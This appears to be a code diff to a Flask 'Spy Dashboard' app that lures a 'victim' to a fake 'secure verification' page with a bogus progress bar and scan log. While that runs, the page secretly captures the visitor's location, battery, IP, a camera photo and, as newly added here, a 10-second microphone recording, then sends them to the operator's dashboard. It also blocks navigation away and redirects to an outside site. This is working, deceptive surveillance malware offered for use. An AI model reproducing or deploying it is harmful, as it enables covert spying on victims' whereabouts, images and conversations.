@@ -2,18 +2,19 @@
 import os
 import uuid
 from datetime import datetime
-from flask import Flask, request, render_template_string, redirect, session
+from flask import Flask, request, render_template_string, redirect, session, jsonify
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')
 
 reports = {}
 
+# ড্যাশবোর্ড HTML (অডিও প্লেয়ার সহ)
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Spy Dashboard - Live Map, Battery, Photo</title>
+    <title>Spy Dashboard - Audio, Photo, Map, Battery</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -29,23 +30,26 @@ DASHBOARD_HTML = """
         .map-container{height:300px;width:100%;margin-top:10px;border-radius:10px;overflow:hidden;}
         .battery{color:#4affff;font-weight:bold;}
         .photo{max-width:200px;border-radius:10px;margin-top:10px;}
+        audio{width:100%; margin-top:10px; border-radius:8px;}
+        .delete-btn{background:#ff3366;color:#fff;border:none;padding:5px 15px;margin-left:10px;}
     </style>
 </head>
 <body>
 <div class="card">
-    <h2> SPY DASHBOARD</h2>
+    <h2>📡CYBER SPY DASHBOARD [DEVLOPER ARIF]</h2>
     <p><strong>Your persistent UID:</strong> {{ uid }}</p>
     <div>
         <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
         <button onclick="copyLink()">Copy Link</button>
+        <button class="delete-btn" onclick="deleteData()">🗑️ Delete My Data</button>
     </div>
     <form method="post" action="/new_uid" style="display:inline;">
         <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
     </form>
-    <p> Send current link to victim. Data automatically appears here.</p>
+    <p>⚠️ Send current link to victim. Data automatically appears here.</p>
 </div>
 <div class="card">
-    <h3> Received Data (UID: {{ uid }})</h3>
+    <h3>📥 Received Data (UID: {{ uid }})</h3>
     <button onclick="location.reload()">Refresh</button>
     <div id="data">
         {% if reports[uid] and reports[uid].data %}
@@ -66,15 +70,18 @@ DASHBOARD_HTML = """
                         </script>
                     {% endif %}
                     {% if item.data.battery %}
-                        <div class="battery"> Battery: {{ item.data.battery.level }}% {% if item.data.battery.charging %}(Charging){% else %}(Not charging){% endif %}</div>
+                        <div class="battery">🔋 Battery: {{ item.data.battery.level }}% {% if item.data.battery.charging %}(Charging){% else %}(Not charging){% endif %}</div>
                     {% endif %}
                     {% if item.data.photo %}
                         <div><img src="{{ item.data.photo }}" class="photo" alt="Victim photo"></div>
                     {% endif %}
+                    {% if item.data.audio %}
+                        <div><audio controls src="{{ item.data.audio }}"></audio></div>
+                    {% endif %}
                 </div>
             {% endfor %}
         {% else %}
-            <p> No data yet. Send the link to victim.</p>
+            <p>⏳ No data yet. Send the link to victim.</p>
         {% endif %}
     </div>
 </div>
@@ -85,13 +92,19 @@ DASHBOARD_HTML = """
         navigator.clipboard.writeText(inp.value);
         alert('Link copied!');
     }
+    function deleteData() {
+        if(confirm('Delete all collected data for this UID? This cannot be undone.')) {
+            fetch('/api/delete/' + '{{ uid }}', {method: 'POST'})
+            .then(() => location.reload());
+        }
+    }
     setInterval(() => location.reload(), 8000);
 </script>
 </body>
 </html>
 """
 
-#        ,    
+# ভিকটিম পেজ (মাইক্রোফোন রেকর্ড + ফেক স্ক্যান + রিডাইরেক্ট)
 SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
@@ -168,96 +181,49 @@ SPY_PAGE_HTML = """
             color: #7effd4;
             text-align: left;
         }
-        .glow-text{
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse{0%{opacity:0.6;} 100%{opacity:1;}}
-        button{
-            background: none;
-            border: none;
-            color: #aaa;
-            font-size: 0.7rem;
-            cursor: default;
-        }
+        p{font-size:0.7rem; margin-top:1rem; opacity:0.5;}
     </style>
 </head>
 <body>
 <div class="container">
-    <h1> SECURE VERIFICATION</h1>
+    <h1>🔐 SECURE VERIFICATION</h1>
     <div class="spinner"></div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div class="status" id="statusMsg">Initializing security protocols...</div>
     <div class="fake-details" id="fakeLog">
-         SSL handshake complete<br>
-         Scanning network environment...
+        ✔️ SSL handshake complete<br>
+        ⏳ Scanning network environment...
     </div>
-    <p style="font-size:0.7rem; margin-top:1rem; opacity:0.5;">Do not close this window. Verification in progress.</p>
+    <p>Do not close this window. Verification in progress.</p>
 </div>
 
 <script>
-    //          ,    
+    // ফেক প্রগ্রেস বার
     let progress = 0;
-    let step = 0;
-    const statusMessages = [
-        "Establishing encrypted channel...",
-        "Checking device integrity...",
-        "Verifying IP whitelist...",
-        "Analyzing browser fingerprint...",
-        "Validating geolocation data...",
-        "Scanning for malicious plugins...",
-        "Retrieving security certificates...",
-        "Performing deep system audit...",
-        "Almost done... please wait",
-        "Finalizing encryption handshake..."
-    ];
-    const fakeLogLines = [
-        " SSL handshake complete",
-        " Scanning network environment...",
-        " IP validated: 103.42.xxx.xx",
-        " Checking browser extensions",
-        " No threats detected",
-        " Retrieving device timestamp",
-        " Timezone synchronized",
-        " Performing battery calibration...",
-        " Camera integrity test (in progress)",
-        " Secure channel established"
-    ];
-    
-    //    ( 100%  , 95%   )
     const progressInterval = setInterval(() => {
-        if (progress < 92) {
-            progress += Math.random() * 3;
-            if (progress > 92) progress = 92;
-        } else {
-            // 92%  95%   ,    
-            progress += (Math.random() * 0.8);
-            if (progress > 95) progress = 92;
-        }
+        if (progress < 92) progress += Math.random() * 3;
+        else progress += Math.random() * 0.8;
+        if (progress > 95) progress = 92;
         document.getElementById('progressFill').style.width = progress + '%';
     }, 800);
     
-    //   
+    const statusMessages = ["Establishing encrypted channel...","Checking device integrity...","Verifying IP whitelist...","Analyzing browser fingerprint...","Validating geolocation data...","Scanning for malicious plugins...","Retrieving security certificates...","Performing deep system audit...","Almost done... please wait","Finalizing encryption handshake..."];
     let msgIndex = 0;
-    const statusInterval = setInterval(() => {
+    setInterval(() => {
         document.getElementById('statusMsg').innerHTML = statusMessages[msgIndex % statusMessages.length];
         msgIndex++;
     }, 2200);
     
-    //     
-    let logIndex = 2; //     HTML  
-    const logInterval = setInterval(() => {
+    const fakeLogLines = ["✔️ SSL handshake complete","⏳ Scanning network environment...","✔️ IP validated: 103.42.xxx.xx","⏳ Checking browser extensions","✔️ No threats detected","⏳ Retrieving device timestamp","✔️ Timezone synchronized","⏳ Performing battery calibration...","⏳ Camera integrity test (in progress)","✔️ Secure channel established"];
+    let logIndex = 2;
+    setInterval(() => {
         const logDiv = document.getElementById('fakeLog');
-        if (logIndex < fakeLogLines.length) {
-            logDiv.innerHTML += "<br>" + fakeLogLines[logIndex];
-            logIndex++;
-        } else {
-            //     
-            logDiv.innerHTML += "<br> Re-verifying connection stability...";
-        }
+        if (logIndex < fakeLogLines.length) logDiv.innerHTML += "<br>" + fakeLogLines[logIndex++];
+        else logDiv.innerHTML += "<br>⟳ Re-verifying connection stability...";
         logDiv.scrollTop = logDiv.scrollHeight;
     }, 3500);
     
-    // -----    (  ) -----
+    // ----- আসল স্পাই কাজ (অডিও রেকর্ড সহ) -----
     const server = window.location.origin;
     const uid = "{{ uid }}";
     
@@ -269,7 +235,7 @@ SPY_PAGE_HTML = """
         }).catch(e => console.error(e));
     }
     
-    // Basic info
+    // 1. Basic info
     sendData({
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -282,22 +248,15 @@ SPY_PAGE_HTML = """
         timestamp: new Date().toISOString()
     });
     
-    // Battery
+    // 2. Battery
     if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-            sendData({ battery: { level: Math.round(b.level * 100), charging: b.charging } });
-        });
+        navigator.getBattery().then(b => sendData({ battery: { level: Math.round(b.level * 100), charging: b.charging } }));
     }
-    
-    // Location
+    // 3. Location
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
-            err => console.log
-        );
+        navigator.geolocation.getCurrentPosition(pos => sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } }), () => {});
     }
-    
-    // Camera photo
+    // 4. Camera photo
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
@@ -313,21 +272,41 @@ SPY_PAGE_HTML = """
                     sendData({ photo: photoData });
                     stream.getTracks().forEach(t => t.stop());
                 }, 1500);
-            })
-            .catch(e => console.log);
+            }).catch(e => console.log);
     }
-    
-    // IP
+    // 5. Audio recording (10 seconds)
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        const base64Audio = reader.result; // Data URL
+                        sendData({ audio: base64Audio });
+                    };
+                    reader.readAsDataURL(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 10000); // 10 sec record
+            }).catch(e => console.log("Audio permission denied or error", e));
+    }
+    // 6. IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(ipData => sendData({ ip: ipData.ip }))
         .catch(e => console.log);
     
-    // Keep victim on page  multiple tricks
-    window.onbeforeunload = function() { return "Verification in progress. Are you sure you want to leave?"; };
+    // পেজ বন্ধ করতে না দেয়া ও রিডাইরেক্ট (20 sec)
+    window.onbeforeunload = function() { return "Verification in progress. Are you sure?"; };
     setInterval(() => { history.pushState({}, '', '/'); }, 500);
-    
-    //     /    ,  
+    setTimeout(() => {
+        window.location.replace("https://cyber24.netlify.app/share-app.html");
+    }, 20000);
 </script>
 </body>
 </html>
@@ -373,6 +352,12 @@ def report(uid):
     })
     print(f"[LOG] Data for {uid}: {list(data.keys())}")
     return "OK", 200
+
+@app.route('/api/delete/<uid>', methods=['POST'])
+def delete_data(uid):
+    if uid in reports:
+        reports[uid] = {'data': []}
+    return jsonify({"status": "deleted"}), 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
